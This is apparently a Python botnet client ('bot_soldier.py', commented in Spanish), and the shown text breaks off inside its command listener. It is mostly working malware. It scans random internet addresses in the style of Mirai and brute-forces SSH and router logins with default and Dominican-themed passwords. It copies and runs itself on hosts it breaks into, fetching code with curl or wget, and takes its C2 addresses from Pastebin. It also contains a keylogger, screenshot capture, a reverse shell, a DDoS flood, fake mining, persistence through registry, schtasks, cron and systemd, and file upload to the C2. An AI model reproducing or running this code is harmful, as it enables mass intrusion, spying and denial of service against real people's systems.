# bot_soldier.py
import socket
import ssl
import json
import time
import threading
import platform
import random
import re
import subprocess
import os
import sys

try:
    import paramiko
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("[!] Paramiko no disponible")

try:
    import netaddr
    HAS_NETADDR = True
except ImportError:
    HAS_NETADDR = False
    print("[!] Netaddr no disponible")

try:
    from scapy.all import ARP, Ether, send, sniff, IP, TCP, Raw, conf
    HAS_SCAPY = True
    conf.verb = 0
except ImportError:
    HAS_SCAPY = False
    print("[!] Scapy no disponible para MITM")

try:
    from shodan_hunter import ShodanHunter
    HAS_SHODAN = True
except ImportError:
    HAS_SHODAN = False
    print("[!] Shodan Hunter no disponible")

# --- CONFIGURACIÓN DINÁMICA ---
# URLs donde está c2_servers.json (Pastebin, Gist, etc.)
JSON_URLS = [
    'https://pastebin.com/raw/1ftfPUa0',  # Pastebin con configuración C2
]

# Fallback si no se puede descargar JSON
C2_SERVERS = [
    {
        'ip': '192.168.56.1',  # IP primaria (rápida, para localhost/LAN)
        'port': 8443,
        'use_tor': False,
        'priority': 1
    },
    {
        'ip': 'tu_direccion_aqui.onion',  # Backup .onion (anónimo, para Internet)
        'port': 8443,
        'use_tor': True,
        'priority': 2
    }
]

# Config actual (se actualizará automáticamente)
C2_IP = C2_SERVERS[0]['ip']
C2_PORT = C2_SERVERS[0]['port']
USE_TOR = C2_SERVERS[0]['use_tor']
BINARY_SERVER = 'http://192.168.56.1:8000'
TOR_PROXY = ('127.0.0.1', 9050)

# Intentos antes de cambiar a siguiente servidor
MAX_RETRIES_PER_SERVER = 3
UPDATE_CONFIG_INTERVAL = 3600  # Actualizar config cada 1 hora
# -------------------

def download_c2_config():
    """Descarga configuración dinámica de C2s desde JSON remoto"""
    global C2_SERVERS
    
    try:
        import urllib.request
        import urllib.error
        
        for url in JSON_URLS:
            try:
                # Intentar descargar JSON
                req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
                response = urllib.request.urlopen(req, timeout=10)
                data = response.read().decode('utf-8')
                
                # Parsear JSON
                config = json.loads(data)
                
                # Validar y actualizar C2_SERVERS
                if 'c2_servers' in config and len(config['c2_servers']) > 0:
                    new_servers = []
                    for server in config['c2_servers']:
                        if server.get('status') == 'active':
                            new_servers.append({
                                'ip': server['address'],
                                'port': server['port'],
                                'use_tor': server.get('use_tor', False),
                                'priority': server.get('priority', 99)
                            })
                    
                    if new_servers:
                        # Ordenar por prioridad
                        new_servers.sort(key=lambda x: x['priority'])
                        C2_SERVERS = new_servers
                        print(f"[✓] Config actualizada: {len(C2_SERVERS)} C2s disponibles")
                        return True
            
            except Exception as e:
                print(f"[!] Error descargando de {url}: {e}")
                continue
        
        print("[!] No se pudo actualizar config, usando fallback")
        return False
    
    except Exception as e:
        print(f"[!] Error en download_c2_config: {e}")
        return False

def update_config_loop():
    """Loop para actualizar configuración periódicamente"""
    while True:
        time.sleep(UPDATE_CONFIG_INTERVAL)
        download_c2_config()

ROUTER_CREDS = [
    ('admin', 'admin'), ('admin', 'password'), ('admin', ''),
    ('admin', '1234'), ('root', 'root'), ('root', 'admin'),
    ('admin', '1234567890'), ('Admin', ''),
]

DEFAULT_CREDS = [
    ('admin', 'admin'), ('root', 'root'), ('test', 'test'),
    ('user', 'password'), ('admin', 'password'),
    ('root', 'password'), ('user', 'user'), ('admin', ''),
    ('root', 'toor'), ('pi', 'raspberry'), ('admin', '1234'),
]

# Generador de contraseñas República Dominicana
RD_PASSWORD_PATTERNS = {
    'nombres_comunes': ['maria', 'juan', 'jose', 'pedro', 'carlos', 'ana', 'luis', 'miguel', 'angel', 'rosa'],
    'apodos': ['tigre', 'leon', 'rey', 'campeon', 'jefe', 'bori', 'cuco', 'nene', 'tato', 'chichi'],
    'equipos': ['licey', 'aguilas', 'escogido', 'toros', 'gigantes', 'estrellas'],
    'religiosos': ['dios', 'jesus', 'jehova', 'bendecido', 'amor', 'familia', 'fe', 'angel'],
    'lugares': ['santo', 'domingo', 'santiago', 'punta', 'cana', 'rd', 'quisqueya'],
    'años': list(range(1960, 2010)),  # Años de nacimiento comunes
    'numeros_comunes': ['123', '1234', '12345', '123456', '2024', '2023', '777', '999'],
    'secuencias': ['qwerty', 'asdf', 'zxcv', '123qwe', 'abc123'],
}

def generate_rd_passwords(count=100):
    """Genera diccionario de contraseñas estilo República Dominicana."""
    passwords = set()
    
    # Patrón 1: [Nombre][Año]
    for nombre in RD_PASSWORD_PATTERNS['nombres_comunes']:
        for año in random.sample(RD_PASSWORD_PATTERNS['años'], 10):
            passwords.add(f"{nombre}{año}")
            passwords.add(f"{nombre.capitalize()}{año}")
    
    # Patrón 2: [Apodo][Número]
    for apodo in RD_PASSWORD_PATTERNS['apodos']:
        for num in RD_PASSWORD_PATTERNS['numeros_comunes'][:5]:
            passwords.add(f"{apodo}{num}")
            passwords.add(f"{apodo.capitalize()}{num}")
    
    # Patrón 3: [Equipo][Año/Palabra]
    for equipo in RD_PASSWORD_PATTERNS['equipos']:
        passwords.add(f"{equipo}campeon")
        passwords.add(f"{equipo}2024")
        passwords.add(f"{equipo}123")
        passwords.add(f"{equipo.capitalize()}2024")
    
    # Patrón 4: [Religioso][Número]
    for palabra in RD_PASSWORD_PATTERNS['religiosos']:
        for num in ['123', '2024', '777']:
            passwords.add(f"{palabra}{num}")
            passwords.add(f"{palabra.capitalize()}{num}")
    
    # Patrón 5: Combinaciones de lugares
    for lugar in RD_PASSWORD_PATTERNS['lugares']:
        passwords.add(f"{lugar}123")
        passwords.add(f"{lugar}2024")
    
    # Patrón 6: Secuencias comunes
    passwords.update(RD_PASSWORD_PATTERNS['secuencias'])
    passwords.update(RD_PASSWORD_PATTERNS['numeros_comunes'])
    
    # Patrón 7: Cédulas simuladas (últimos 4-5 dígitos)
    for i in range(20):
        cedula_end = random.randint(1000, 9999)
        passwords.add(str(cedula_end))
    
    return list(passwords)[:count]

# Generar diccionario al iniciar
CUSTOM_PASSWORDS = generate_rd_passwords(150)

VULN_DATABASE = {
    'vsftpd': {
        '2.3.4': {
            'cve': 'CVE-2011-2523',
            'severity': 'Critical',
            'name': 'vsftpd 2.3.4 Backdoor',
            'exploit_url': 'https://www.exploit-db.com/exploits/17491',
            'metasploit': 'exploit/unix/ftp/vsftpd_234_backdoor'
        }
    },
    'openssh': {
        '7.4': {
            'cve': 'CVE-2018-15473',
            'severity': 'Medium',
            'name': 'OpenSSH User Enumeration',
            'exploit_url': 'https://www.exploit-db.com/exploits/45233',
            'metasploit': 'auxiliary/scanner/ssh/ssh_enumusers'
        }
    },
    'apache': {
        '2.4.49': {
            'cve': 'CVE-2021-41773',
            'severity': 'Critical',
            'name': 'Apache Path Traversal & RCE',
            'exploit_url': 'https://www.exploit-db.com/exploits/50383',
            'metasploit': 'exploit/multi/http/apache_normalize_path_rce'
        }
    }
}

bot_state = {
    'status': 'RECON',
    'report': {},
    'mitm_active': False,
    'gateway_ip': None,
    'auto_replicate': False,
    'shodan_hunting': False,
    'shodan_hunter': None,
    'keylogger_active': False,
    'reverse_shell_active': False,
    'miner_active': False,
    'ddos_target': None
}

def get_system_info():
    """Recopila información básica del sistema."""
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
    except:
        hostname = "unknown"
        local_ip = "0.0.0.0"
        
    return {
        'id': f"{hostname}-{local_ip}",
        'os': platform.system(),
        'arch': platform.machine(),
        'hostname': hostname,
        'ip': local_ip
    }

def get_gateway_ip():
    """Obtiene la IP del gateway/router."""
    try:
        if platform.system() == 'Windows':
            result = subprocess.check_output('ipconfig', shell=True).decode('utf-8', errors='ignore')
            for line in result.split('\n'):
                if 'Default Gateway' in line or 'Puerta de enlace' in line:
                    parts = line.split(':')
                    if len(parts) > 1:
                        gateway = parts[-1].strip()
                        if gateway and '.' in gateway:
                            return gateway
        else:
            result = subprocess.check_output('ip route | grep default', shell=True).decode('utf-8')
            gateway = result.split()[2]
            return gateway
    except:
        pass
    
    # Fallback
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        parts = local_ip.split('.')
        return f"{parts[0]}.{parts[1]}.{parts[2]}.1"
    except:
        return None

def grab_banner(ip, port, send_data=None):
    """Obtiene el banner de un servicio."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        sock.connect((ip, port))
        
        if send_data:
            sock.sendall(send_data)
        
        banner = sock.recv(2048).decode('utf-8', errors='ignore')
        sock.close()
        return banner
    except:
        return ""

def parse_version(banner, service_type):
    """Extrae la versión de un banner."""
    version_patterns = {
        'ftp': [r'vsFTPd (\d+\.\d+\.\d+)', r'ProFTPD (\d+\.\d+\.\d+)'],
        'ssh': [r'OpenSSH[_-](\d+\.\d+)'],
        'http': [r'Apache/(\d+\.\d+\.\d+)', r'nginx/(\d+\.\d+\.\d+)']
    }
    
    patterns = version_patterns.get(service_type, [])
    for pattern in patterns:
        match = re.search(pattern, banner, re.IGNORECASE)
        if match:
            return match.group(1)
    return None

def check_vulnerability(service_name, version):
    """Busca vulnerabilidades conocidas."""
    service_name_lower = service_name.lower()
    
    for vuln_service, versions in VULN_DATABASE.items():
        if vuln_service in service_name_lower:
            if version in versions:
                return versions[version]
    
    return None

def check_service_vuln(ip, port):
    """Verifica vulnerabilidades de un servicio."""
    vulns = []
    service_name = "Unknown"
    banner = ""
    version = None
    
    port_service_map = {
        21: ('ftp', None),
        22: ('ssh', None),
        80: ('http', b"GET / HTTP/1.0\r\n\r\n"),
        443: ('http', b"GET / HTTP/1.0\r\n\r\n"),
        8080: ('http', b"GET / HTTP/1.0\r\n\r\n"),
    }
    
    if port not in port_service_map:
        return vulns, service_name, banner, version
    
    service_type, send_data = port_service_map[port]
    banner = grab_banner(ip, port, send_data)
    
    if not banner:
        return vulns, service_name, banner, version
    
    # Detectar servicio
    if port == 21:
        service_name = 'vsftpd' if 'vsftpd' in banner.lower() else 'FTP'
    elif port == 22:
        service_name = 'OpenSSH' if 'openssh' in banner.lower() else 'SSH'
    elif port in [80, 443, 8080]:
        service_name = 'Apache' if 'apache' in banner.lower() else 'HTTP'
    
    version = parse_version(banner, service_type)
    
    if version:
        vuln_data = check_vulnerability(service_name, version)
        if vuln_data:
            vulns.append({
                'type': vuln_data['name'],
                'severity': vuln_data['severity'],
                'cve': vuln_data['cve'],
                'exploit_url': vuln_data['exploit_url'],
                'metasploit': vuln_data['metasploit'],
                'exploitable': True,
                'version': version
            })
    
    if port in [21, 22]:
        vulns.append({
            'type': f'{service_name} - Weak Credentials',
            'severity': 'High',
            'cve': 'N/A',
            'exploit_url': 'Brute Force Attack',
            'metasploit': None,
            'exploitable': True,
            'version': version or 'Unknown'
        })
    
    return vulns, service_name, banner, version

def attack_router_http(gateway_ip):
    """Intenta atacar el router."""
    print(f"\033[93m[*] Atacando router en {gateway_ip}\033[0m")
    vulns_found = []
    
    for port in [80, 8080]:
        try:
            for user, pwd in ROUTER_CREDS:
                try:
                    import base64
                    credentials = base64.b64encode(f"{user}:{pwd}".encode()).decode()
                    
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((gateway_ip, port))
                    
                    request = f"GET / HTTP/1.1\r\nHost: {gateway_ip}\r\nAuthorization: Basic {credentials}\r\n\r\n"
                    sock.sendall(request.encode())
                    response = sock.recv(4096).decode('utf-8', errors='ignore')
                    sock.close()
                    
                    if '200 OK' in response and '401' not in response:
                        vuln = {
                            'type': 'Router Compromised',
                            'severity': 'Critical',
                            'cve': 'N/A',
                            'exploit_url': f'http://{gateway_ip}:{port}',
                            'credentials': f'{user}:{pwd}',
                            'exploitable': True
                        }
                        vulns_found.append(vuln)
                        print(f"\033[92m[+] Router pwned! {user}:{pwd}\033[0m")
                        return vulns_found
                except:
                    continue
        except:
            continue
    
    return vulns_found

def generate_random_ip():
    """Genera IP aleatoria evitando rangos reservados (estilo Mirai original)."""
    while True:
        # Generar IP aleatoria
        a = random.randint(1, 223)
        b = random.randint(0, 255)
        c = random.randint(0, 255)
        d = random.randint(0, 255)
        
        ip = f"{a}.{b}.{c}.{d}"
        
        # Evitar rangos reservados/privados
        reserved_prefixes = [
            '0.', '10.', '127.', '169.254.', '172.16.', '172.17.', '172.18.', 
            '172.19.', '172.20.', '172.21.', '172.22.', '172.23.', '172.24.',
            '172.25.', '172.26.', '172.27.', '172.28.', '172.29.', '172.30.',
            '172.31.', '192.168.', '224.', '240.'
        ]
        
        if not any(ip.startswith(prefix) for prefix in reserved_prefixes):
            return ip

def scan_network(ip_range_str):
    """Escanea redes aleatorias globalmente (estilo Mirai)."""
    live_hosts = []
    
    # ESTRATEGIA MIRAI: Escaneo de IPs aleatorias globales
    print(f"\033[96m[*] 🌍 MODO MIRAI: Escaneando IPs aleatorias globales...\033[0m")
    
    # Generar 50 IPs aleatorias para escanear
    scan_count = 50
    targets_found = 0
    
    for i in range(scan_count):
        target_ip = generate_random_ip()
        
        # Escanear puerto 22 (SSH), 23 (Telnet), 2323 (Telnet alternativo)
        for port in [22, 23, 2323]:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)  # Timeout muy corto para escaneo rápido
            
            try:
                result = sock.connect_ex((target_ip, port))
                if result == 0:
                    print(f"\033[92m[+] {target_ip}:{port} ABIERTO\033[0m")
                    targets_found += 1
                    
                    # Obtener banner
                    try:
                        banner = grab_banner(target_ip, port)
                        service = 'SSH' if port == 22 else 'Telnet'
                        
                        vulns = [{
                            'type': f'{service} - Weak Credentials',
                            'severity': 'Critical',
                            'cve': 'N/A',
                            'exploit_url': 'Brute Force Attack',
                            'metasploit': None,
                            'exploitable': True,
                            'version': banner[:50] if banner else 'Unknown'
                        }]
                        
                        host_info = {
                            'ip': target_ip,
                            'port': port,
                            'service': service,
                            'version': banner[:50] if banner else 'Unknown',
                            'banner': banner[:150] if banner else '',
                            'vulnerabilities': vulns,
                            'severity': 'Critical',
                            'vuln': f"{service} - Weak Credentials"
                        }
                        
                        live_hosts.append(host_info)
                        
                        # Auto-replicación inmediata si está activada
                        if bot_state['auto_replicate']:
                            print(f"\033[91m[*] Auto-explotando {target_ip}:{port}...\033[0m")
                            exploit_ssh(target_ip, port, 'auto')
                    except:
                        pass
            except:
                pass
            finally:
                sock.close()
        
        # Mostrar progreso cada 10 IPs
        if (i + 1) % 10 == 0:
            print(f"\033[93m[*] Progreso: {i+1}/{scan_count} IPs escaneadas, {targets_found} objetivos encontrados\033[0m")
    
    # OPCIONAL: También escanear red local (LAN)
    print(f"\n\033[96m[*] 📡 Escaneando red local...\033[0m")
    
    try:
        # Obtener rango de red local
        local_ip_parts = ip_range_str.split('/')[0].split('.')
        if len(local_ip_parts) == 4:
            base = f"{local_ip_parts[0]}.{local_ip_parts[1]}.{local_ip_parts[2]}"
            
            # Escanear rango local (1-254)
            for i in range(1, 255):
                ip_str = f"{base}.{i}"
                
                for port in [22, 23, 2323]:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.2)
                    
                    try:
                        if sock.connect_ex((ip_str, port)) == 0:
                            print(f"\033[92m[+] LAN: {ip_str}:{port} ABIERTO\033[0m")
                            
                            banner = grab_banner(ip_str, port)
                            service = 'SSH' if port == 22 else 'Telnet'
                            
                            vulns = [{
                                'type': f'{service} - Weak Credentials (LAN)',
                                'severity': 'High',
                                'cve': 'N/A',
                                'exploit_url': 'Brute Force Attack',
                                'metasploit': None,
                                'exploitable': True,
                                'version': 'Unknown'
                            }]
                            
                            host_info = {
                                'ip': ip_str,
                                'port': port,
                                'service': service,
                                'version': banner[:50] if banner else 'Unknown',
                                'banner': banner[:150] if banner else '',
                                'vulnerabilities': vulns,
                                'severity': 'High',
                                'vuln': f"{service} - Weak Credentials (LAN)"
                            }
                            
                            live_hosts.append(host_info)
                            
                            if bot_state['auto_replicate']:
                                exploit_ssh(ip_str, port, 'auto')
                    except:
                        pass
                    finally:
                        sock.close()
    except Exception as e:
        print(f"\033[91m[!] Error en escaneo LAN: {e}\033[0m")
    
    print(f"\n\033[92m[✓] Escaneo completado: {len(live_hosts)} objetivos encontrados\033[0m")
    return live_hosts

# ═══════════════════════════════════════════════════════════
#  🔥 NUEVAS CAPACIDADES AVANZADAS DEL BOT
# ═══════════════════════════════════════════════════════════

def keylogger_start():
    """Inicia keylogger (simulado para educación)."""
    try:
        from pynput import keyboard
        
        log_file = "/tmp/.keylog.txt" if platform.system() != 'Windows' else "C:\\Windows\\Temp\\.keylog.txt"
        
        def on_press(key):
            try:
                with open(log_file, 'a') as f:
                    f.write(f"{key.char}")
            except AttributeError:
                with open(log_file, 'a') as f:
                    f.write(f" [{key}] ")
        
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        bot_state['keylogger_active'] = True
        return True, log_file
    except ImportError:
        return False, "pynput no instalado"

def take_screenshot():
    """Captura pantalla del sistema."""
    try:
        from PIL import ImageGrab
        import io
        import base64
        
        screenshot = ImageGrab.grab()
        buffer = io.BytesIO()
        screenshot.save(buffer, format='PNG')
        img_data = base64.b64encode(buffer.getvalue()).decode()
        
        return True, img_data[:1000]  # Primeros 1000 caracteres
    except ImportError:
        return False, "Pillow no instalado"
    except Exception as e:
        return False, str(e)

def start_reverse_shell(c2_ip, c2_port=4444):
    """Shell reversa hacia el C2."""
    try:
        import subprocess
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((c2_ip, c2_port))
        
        if platform.system() == 'Windows':
            shell = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, 
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            shell = subprocess.Popen(['/bin/bash'], stdin=subprocess.PIPE,
                                   stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        bot_state['reverse_shell_active'] = True
        return True, "Shell reversa iniciada"
    except Exception as e:
        return False, str(e)

def ddos_attack(target_ip, target_port, duration=60):
    """Ataque DDoS coordinado (simulado - solo para educación)."""
    try:
        print(f"\033[91m[*] Iniciando DDoS simulado contra {target_ip}:{target_port}\033[0m")
        bot_state['ddos_target'] = f"{target_ip}:{target_port}"
        
        end_time = time.time() + duration
        packets_sent = 0
        
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                sock.connect((target_ip, target_port))
                sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n" * 100)
                sock.close()
                packets_sent += 1
                
                if packets_sent % 100 == 0:
                    print(f"\033[93m[*] DDoS: {packets_sent} paquetes enviados\033[0m")
            except:
                pass
        
        bot_state['ddos_target'] = None
        return True, f"DDoS completado: {packets_sent} paquetes enviados"
    except Exception as e:
        return False, str(e)

def crypto_miner_simulate():
    """Simulador de minería de criptomonedas (educativo)."""
    try:
        print("\033[93m[*] Iniciando minería simulada...\033[0m")
        bot_state['miner_active'] = True
        
        # Simulación: uso intensivo de CPU
        import hashlib
        mined_hashes = 0
        start_time = time.time()
        
        for i in range(100000):
            hashlib.sha256(f"block_{i}_{time.time()}".encode()).hexdigest()
            mined_hashes += 1
            
            if mined_hashes % 10000 == 0:
                elapsed = time.time() - start_time
                rate = mined_hashes / elapsed
                print(f"\033[92m[*] Minería: {mined_hashes} hashes @ {rate:.2f} H/s\033[0m")
        
        bot_state['miner_active'] = False
        return True, f"Minería simulada: {mined_hashes} hashes en {elapsed:.2f}s"
    except Exception as e:
        bot_state['miner_active'] = False
        return False, str(e)

def install_persistence():
    """Persistencia avanzada multi-plataforma."""
    try:
        system = platform.system()
        script_path = os.path.abspath(__file__)
        
        if system == 'Windows':
            # Método 1: Registro de Windows (Run key)
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                r"Software\Microsoft\Windows\CurrentVersion\Run", 
                                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{script_path}"')
            winreg.CloseKey(key)
            
            # Método 2: Tarea programada
            task_cmd = f'schtasks /create /tn "SystemUpdate" /tr "\\\"{sys.executable}\\\" \\\"{script_path}\\\"" /sc onstart /ru SYSTEM /f'
            subprocess.run(task_cmd, shell=True, capture_output=True)
            
            return True, "Persistencia Windows instalada (Registro + Tarea)"
        
        elif system == 'Linux':
            # Método 1: Crontab
            cron_entry = f"@reboot {sys.executable} {script_path} &\n"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -', 
                         shell=True, capture_output=True)
            
            # Método 2: Systemd service
            service_content = f"""[Unit]
Description=System Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            service_path = "/etc/systemd/system/system-service.service"
            try:
                with open(service_path, 'w') as f:
                    f.write(service_content)
                subprocess.run("systemctl enable system-service", shell=True, capture_output=True)
            except:
                pass
            
            return True, "Persistencia Linux instalada (Crontab + Systemd)"
        
        else:
            return False, f"Sistema {system} no soportado"
    
    except Exception as e:
        return False, str(e)

def upload_file(file_path, c2_socket):
    """Sube archivo al C2."""
    try:
        with open(file_path, 'rb') as f:
            file_data = f.read()
        
        import base64
        encoded_data = base64.b64encode(file_data).decode()
        
        response = {
            'action': 'file_upload',
            'filename': os.path.basename(file_path),
            'data': encoded_data[:10000],  # Primeros 10KB
            'size': len(file_data)
        }
        c2_socket.sendall(json.dumps(response).encode('utf-8'))
        return True, f"Archivo {file_path} subido ({len(file_data)} bytes)"
    except Exception as e:
        return False, str(e)

def download_file(url, dest_path):
    """Descarga archivo desde URL."""
    try:
        import urllib.request
        urllib.request.urlretrieve(url, dest_path)
        return True, f"Archivo descargado en {dest_path}"
    except Exception as e:
        return False, str(e)

def exploit_ssh(target_ip, target_port, payload_url):
    """Explota SSH con credenciales débiles + diccionario RD personalizado."""
    if not HAS_PARAMIKO:
        return False
        
    print(f"\033[93m[*] Explotando SSH {target_ip}:{target_port}\033[0m")
    
    # PRIMERO: Intentar credenciales por defecto
    all_creds = list(DEFAULT_CREDS)
    
    # SEGUNDO: Agregar usuarios comunes con contraseñas RD
    common_users = ['root', 'admin', 'user', 'test', 'ubuntu', 'centos', 'debian']
    for user in common_users:
        for pwd in CUSTOM_PASSWORDS[:30]:  # Top 30 contraseñas RD
            all_creds.append((user, pwd))
    
    print(f"\033[96m[*] Probando {len(all_creds)} combinaciones (incluye diccionario RD)\033[0m")
    
    for user, pwd in all_creds:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(target_ip, port=target_port, username=user, password=pwd, timeout=5)
            
            print(f"\033[92m[+] Acceso SSH: {user}@{target_ip}\033[0m")
            
            # Detectar sistema
            stdin, stdout, stderr = client.exec_command('uname -s', timeout=5)
            os_type = stdout.read().decode('utf-8').strip().lower()
            
            stdin, stdout, stderr = client.exec_command('uname -m', timeout=5)
            arch = stdout.read().decode('utf-8').strip()
            
            print(f"\033[96m[*] Sistema: {os_type} {arch}\033[0m")
            
            # MÉTODO 1: DESACTIVADO TEMPORALMENTE - Usar Python directamente
            print(f"\033[93m[*] Saltando Método 1 (binario con IP incorrecta)...\033[0m")
            print(f"\033[93m[*] Usando Método 2 (Python) para replicación correcta...\033[0m")
            
            # MÉTODO 2: Python (FALLBACK)
            print(f"\033[93m[*] Método 2: Intentando Python...\033[0m")
            
            stdin, stdout, stderr = client.exec_command('which python3 || which python', timeout=5)
            python_path = stdout.read().decode('utf-8').strip()
            
            if python_path:
                print(f"\033[96m[*] Python encontrado: {python_path}\033[0m")
                
                # Verificar/instalar dependencias
                print(f"\033[93m[*] Instalando dependencias...\033[0m")
                install_cmd = "pip3 install --user --quiet paramiko netaddr cryptography 2>/dev/null"
                client.exec_command(install_cmd, timeout=30)
                
                # Copiar código Python (detectar si estamos en ejecutable PyInstaller)
                try:
                    # Intentar leer el archivo fuente
                    if getattr(sys, 'frozen', False):
                        # Estamos en un ejecutable PyInstaller, descargar desde servidor
                        print(f"\033[93m[*] Ejecutable detectado, descargando código fuente...\033[0m")
                        
                        # Intentar descargar bot_soldier.py del servidor
                        download_cmd = f"curl -s -f {BINARY_SERVER}/bot_soldier.py 2>/dev/null || wget -q -O - {BINARY_SERVER}/bot_soldier.py 2>/dev/null"
                        stdin, stdout, stderr = client.exec_command(download_cmd, timeout=10)
                        bot_code = stdout.read().decode('utf-8')
                        
                        if not bot_code or len(bot_code) < 100:
                            print(f"\033[91m[!] No se pudo descargar bot_soldier.py, saltando método Python\033[0m")
                            raise Exception("Cannot download source code")
                    else:
                        # Estamos ejecutando el script directamente
                        bot_code = open(__file__, 'r', encoding='utf-8').read()
                except Exception as e:
                    print(f"\033[91m[!] No se pudo obtener código fuente: {e}\033[0m")
                    client.close()
                    continue
                
                # Modificar IP del C2 para Docker
                if '127.0.0.1' in target_ip:
                    modified_code = bot_code.replace("C2_IP = '127.0.0.1'", "C2_IP = 'host.docker.internal'")
                else:
                    modified_code = bot_code.replace("C2_IP = '127.0.0.1'", f"C2_IP = '{C2_IP}'")
                
                # Crear comando seguro
                copy_cmd = f"cat > /tmp/.bot.py << 'EOFBOT'\n{modified_code}\nEOFBOT\n"
                copy_cmd += f"chmod +x /tmp/.bot.py\n"
                copy_cmd += f"nohup {python_path} /tmp/.bot.py > /tmp/.bot.log 2>&1 &\n"
                copy_cmd += "sleep 1\n"
                copy_cmd += 'ps aux | grep "[.]bot.py" && echo "PYTHON_SUCCESS" || echo "PYTHON_FAIL"\n'
                
                stdin, stdout, stderr = client.exec_command(copy_cmd, timeout=15)
                result = stdout.read().decode('utf-8').strip()
                
                if "PYTHON_SUCCESS" in result:
                    print(f"\033[92m[+] ✓ REPLICACIÓN EXITOSA con Python!\033[0m")
                    client.close()
                    return True
                else:
                    print(f"\033[91m[!] Python falló\033[0m")
            else:
                print(f"\033[91m[!] Python no encontrado\033[0m")
            
            # MÉTODO 3: Shell script persistente (DESHABILITADO - requiere binarios compilados)
            # Si el método Python falló, no hay más opciones
            print(f"\033[91m[!] Todos los métodos de replicación fallaron\033[0m")
            client.close()
            return False
            
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"\033[91m[!] Error: {str(e)[:100]}\033[0m")
            continue
    
    return False

def listen_for_commands(c2_socket):
    """Escucha comandos del C2."""
    global bot_state
    while True:
        try:
            data = c2_socket.recv(4096)
            if not data:
                break
            
            command = json.loads(data.decode('utf-8'))
            print(f"\n\033[91m[!] ORDEN: {command['action']}\033[0m")

            if command['action'] == 'toggle_auto_replicate':
                bot_state['auto_replicate'] = command['enabled']
                status = "ON" if command['enabled'] else "OFF"
                print(f"[*] Auto-replicación: {status}")
                # Enviar confirmación con 'action'
                c2_socket.sendall(json.dumps({
                    'action': 'response',
                    'status': f'auto_replicate_{status.lower()}'
                }).encode('utf-8'))
            
            elif command['action'] == 'exploit':
                target = command['target']
                print(f"\033[91m[*] Explotando {target['ip']}:{target['port']}...\033[0m")
                
                if exploit_ssh(target['ip'], target['port'], 'auto'):
                    print(f"\033[92m[+] Explotación exitosa de {target['ip']}\033[0m")
                    # Enviar confirmación exitosa
                    c2_socket.sendall(json.dumps({
                        'action': 'response',
                        'status': 'exploit_success',
                        'target': target
                    }).encode('utf-8'))
                else:
                    print(f"\033[91m[!] Fallo al explotar {target['ip']}\033[0m")
                    # Enviar confirmación de fallo
                    c2_socket.sendall(json.dumps({
                        'action': 'response',
                        'status': 'exploit_fail',
                        'target': target
                    }).encode('utf-8'))

            elif command['action'] == 'set_status':
                bot_state['status'] = command['status']
                print(f"\033[96m[*] Estado cambiado a: {bot_state['status']}\033[0m")
                # Enviar confirmación
                c2_socket.sendall(json.dumps({
                    'action': 'response',
                    'status': f'status_changed_to_{bot_state["status"].lower()}'
                }).encode('utf-8'))
            
            elif command['action'] == 'shodan_hunt':
                # Iniciar caza automática con Shodan
                if not HAS_SHODAN:
                    print(f"\033[91m[!] Shodan Hunter no disponible\033[0m")
                    c2_socket.sendall(json.dumps({
                        'action': 'response',
                        'status': 'shodan_not_available'
                    }).encode('utf-8'))
                else:
                    api_keys = command.get('api_keys', [])
                    bot_state['shodan_hunting'] = True
                    bot_state['shodan_hunter'] = ShodanHunter(api_keys if api_keys else None)
                    
                    print(f"\033[92m[*] Iniciando caza automática con Shodan...\033[0m")
                    
                    def shodan_callback(targets):
                        """Callback cuando se encuentran objetivos."""
                        print(f"\033[93m[+] Shodan encontró {len(targets)} objetivos\033[0m")
                        
                        # Explotar automáticamente si auto_replicate está activo
                        if bot_state['auto_replicate']:
                            for target in targets:
                                print(f"\033[96m[*] Auto-explotando {target['ip']}:{target['port']}\033[0m")
                                success = exploit_ssh(target['ip'], target['port'])
                                if success:
                                    c2_socket.sendall(json.dumps({
                                        'action': 'response',
                                        'status': 'shodan_exploit_success',
                                        'target': target
                                    }).encode('utf-8'))
                        else:
                            # Solo enviar reporte
                            c2_socket.sendall(json.dumps({
                                'action': 'shodan_report',
                                'targets': targets
                            }).encode('utf-8'))
                    
                    # Iniciar caza en thread separado
                    hunt_thread = threading.Thread(
                        target=bot_state['shodan_hunter'].hunt_continuous,
                        args=(shodan_callback,),
                        daemon=True
                    )
                    hunt_thread.start()
                    
                    c2_socket.sendall(json.dumps({
                        'action': 'response',
                        'status': 'shodan_hunting_started'
                    }).encode('utf-8'))
            
            elif command['action'] == 'shodan_stop':
                bot_state['shodan_hunting'] = False
                print(f"\033[93m[*] Deteniendo caza Shodan...\033[0m")
                c2_socket.sendall(json.dumps({
                    'action': 'response',
                    'status': 'shodan_hunting_stopped'
                }).encode('utf-8'))
            
            # ═══ NUEVOS COMANDOS ═══
            elif command['action'] == 'keylogger_start':
                success, result = keylogger_start()
